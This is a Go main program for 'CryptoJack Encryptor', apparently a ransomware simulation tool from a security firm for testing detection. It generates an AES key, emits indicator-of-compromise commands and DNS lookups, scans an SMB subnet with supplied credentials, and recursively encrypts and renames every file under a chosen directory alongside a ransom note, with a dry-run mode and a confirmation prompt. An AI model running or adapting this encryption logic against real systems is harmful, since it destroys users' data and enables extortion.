package main

import (
	"cryptojack/cjlib"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"time"
)

func main() {
	rand.Seed(time.Now().Unix())
	const banner = `
_________________________________________________

    ╔═╗┬─┐┬ ┬┌─┐┌┬┐┌─┐ ╦┌─┐┌─┐┬┌─
    ║  ├┬┘└┬┘├─┘ │ │ │ ║├─┤│  ├┴┐
    ╚═╝┴└─ ┴ ┴   ┴ └─┘╚╝┴ ┴└─┘┴ ┴
    ENCRYPTOR
	
    Version 1.0.1 by Joff Thyer
    Black Hills Information Security
    Copyright (c) 2022
__________________________________________________
`

	fmt.Println(banner)
	arg_dryrun := flag.Bool("n", false, "perform a dryrun without any encryption actions")
	arg_norename := flag.Bool("norename", false, "Dont rename files to encrypted filename + extension")
	arg_cryptext := flag.String("ext", ".cryptojack", "file extension to use for renamed content")
	arg_directory := flag.String("d", "", "Specify a starting directory. This is required.")
    arg_yaml := flag.String("y", "", "Specify a YAML IOC profile file name.")
    arg_username := flag.String("user", "guest", "Username for SMB activities (default of guest)")
    arg_password := flag.String("pass", "", "Password for SMB activities (default of guest)")
    arg_domain := flag.String("domain", ".", "Domain name for SMB activities (default of .)")
	flag.Parse()

	// AES encryption key
	aeskey := cjlib.NewEncryptionKey()
    if len(*arg_directory) == 0 {
        panic("you must specify the -d <directory> option")
    }
	if *arg_dryrun {
		fmt.Println("[*] DRY RUN Mode: No files will be encrypted.")
	} else {
		fmt.Printf(`
[*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
[*]
[*] You are about to encrypt ALL files recursively in the target
[*] directory: [%s]
[*]
[*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
`, *arg_directory)
		fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
		ans := []byte("N")
		os.Stdin.Read(ans)
		if ans[0] != 89 {
			os.Exit(0)
		}
	}

    var config cjlib.YAML_CONFIG
    var err error
    file_ext := *arg_cryptext
    exclusions := []string {".exe", ".dll", ".lnk", ".sys"}
    if len(*arg_yaml) > 0 {
        config, err = cjlib.ReadYamlConfig(*arg_yaml)
        if (err != nil) { panic(err) }
        if len(config.File_extension) > 0 {
            file_ext = config.File_extension
        }
        exclusions = config.Exclude
    }

    // Shoot out some IOCS
    cjlib.Request_IOC_Commands(config)
    cjlib.Request_IOC_DNS(config)
    cjlib.SMBScanSubnet(*arg_username, *arg_password, *arg_domain)


    // Encrypting directory structure
	_, _, _, err = cjlib.EncryptDirectoryStructure(
		*arg_directory, aeskey, exclusions,
		file_ext, config.Ransom_note, *arg_norename, *arg_dryrun)
	if err != nil {
		fmt.Printf("[-] %s\n", err.Error())
        os.Exit(1)
	}
    fmt.Println("[*] COMPLETED SUCCESSFULLY")
}
